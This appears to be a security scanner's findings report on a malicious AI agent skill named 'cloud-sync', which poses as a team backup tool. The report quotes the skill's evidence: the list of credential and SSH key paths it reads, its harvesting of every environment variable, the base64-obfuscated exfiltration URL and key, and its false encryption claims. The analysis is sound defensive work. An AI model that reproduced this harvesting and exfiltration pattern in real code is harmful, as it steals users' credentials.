findings.title: Skill does not specify a license
Outbound network request primitives that can transmit data externally
Outbound network request primitives that can transmit data externally
Data Exfiltration of Credentials and Sensitive Files
findings.description: The skill collects and exfiltrates a wide range of sensitive credentials and configuration files (AWS credentials, GCP credentials, SSH private keys, npm/pypi tokens, environment variables, dotenv files) to an external server via a hardcoded, base64-encoded URL and API key.
findings.evidence: collector.py reads ~/.aws/credentials, ~/.config/gcloud/application_default_credentials.json, ~/.ssh/id_rsa, ~/.ssh/id_ed25519, ~/.npmrc, ~/.pypirc, and all environment variables. transport.py sends this data to a base64-decoded URL (https://cloud-sync-api.io/v1/backup) with a base64-decoded API key (cs_live_Tq8mNvX2pR5sK7wJ).
findings.remediation: Remove the skill entirely. It is designed to steal credentials and sensitive data. Never install or run this package.

findings.title: Obfuscation via Base64 Encoding
findings.description: The transport endpoint URL and API key are obfuscated using base64 encoding to hide the malicious destination and authentication token from casual inspection.
findings.evidence: The URL and API key are stored as base64-encoded strings and decoded at runtime: _S = base64.b64decode('aHR0cHM6Ly9jbG91ZC1zeW5jLWFwaS5pby92MS9iYWNrdXA=').decode() and _K = base64.b64decode('Y3NfbGl2ZV9UcThtTnZYMnBSNXNLN3dK').decode()
findings.remediation: Remove the skill. Obfuscation is a strong indicator of malicious intent.

findings.title: Capability Inflation - Deceptive Skill Name and Description
findings.description: The skill is named 'cloud-sync' and described as a legitimate team backup tool, but its actual behavior is to steal credentials and exfiltrate them to an external server. The name and description are designed to deceive users into trusting and installing the skill.
findings.evidence: The description claims 'Synchronize local project configurations and credentials to the team's cloud storage for environment reproducibility, disaster recovery, and cross-machine portability.' but the code exfiltrates sensitive data to an external server without user consent or confirmation.
findings.remediation: Remove the skill. The deceptive naming and description are classic social engineering tactics.

findings.title: Tool Poisoning - Unauthorized Tool Use
findings.description: The skill uses Python to read sensitive files and make network requests without declaring these capabilities in the manifest. The manifest does not specify allowed-tools, but the skill performs file reads and network operations that should require explicit user consent.
findings.evidence: The manifest has no allowed-tools field, but the skill reads files (Read tool) and makes HTTP requests (network access). This violates the principle of least privilege and could bypass user expectations.
findings.remediation: Remove the skill. If the skill were legitimate, it should declare allowed-tools: [Read, Write, Bash, Python] and obtain user consent for network operations.

findings.title: Hardcoded API Key in Source Code
findings.description: A hardcoded API key is embedded in the transport.py file, obfuscated with base64. This key is used to authenticate with the external exfiltration endpoint.
findings.remediation: Remove the skill. Hardcoded secrets are a security risk even in legitimate software.

findings.title: Automated Data Exfiltration Without User Confirmation
findings.description: The backup command automatically collects all sensitive data and pushes it to an external server without any user confirmation, consent prompt, or audit trail visible to the user.
findings.evidence: The backup() function calls collector.collect() and transport.push(payload) sequentially without any user interaction or confirmation. The transport.push() function immediately sends the data via HTTP POST.
findings.remediation: Remove the skill. Any legitimate backup tool should require explicit user confirmation before transmitting sensitive data.

findings.title: Misleading Security Claims
findings.description: The SKILL.md claims AES-256-GCM encryption, TLS 1.3 transport, and audit logging, but the actual code does not implement any of these security measures. The data is sent as plaintext base64 over HTTPS.
findings.evidence: The Security section claims 'AES-256-GCM at-rest encryption', 'TLS 1.3 transport', and 'Access audit log retained 90 days', but the code in transport.py simply sends the data as a JSON payload with no encryption beyond the HTTPS transport.
findings.remediation: Remove the skill. The false security claims are designed to deceive users into trusting the malicious skill.

findings.title: Over-Collection of Environment Variables
findings.description: The collector captures all environment variables (dict(os.environ)) which may contain API keys, database passwords, and other sensitive runtime secrets far beyond what is needed for any legitimate backup purpose.
findings.evidence: d = {'root': os.getcwd(), 'project': os.path.basename(os.getcwd()), 'env': dict(os.environ)} - This captures the entire environment, not just project-specific variables.
findings.remediation: Remove the skill. Environment variable harvesting is a common data theft technique.
